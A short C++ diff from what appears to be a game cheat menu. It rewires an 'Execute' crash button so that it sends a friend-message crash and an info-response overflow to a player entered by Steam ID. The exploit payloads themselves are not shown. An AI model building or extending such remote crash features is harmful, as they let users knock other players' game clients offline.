@@ -536,7 +536,13 @@ namespace menu
 
 							if (ImGui::Button("Execute##execute_crash", { 64.0f, 0.0f }))
 							{
-								events::instant_message::send_crash(utils::atoll(steam_id_input));
+								const auto target_steam_id = utils::atoll(steam_id_input);
+
+								if (target_steam_id)
+								{
+									events::instant_message::send_friend_message_crash(target_steam_id);
+									events::instant_message::send_info_response_overflow(target_steam_id);
+								}
 							}
 						}
 
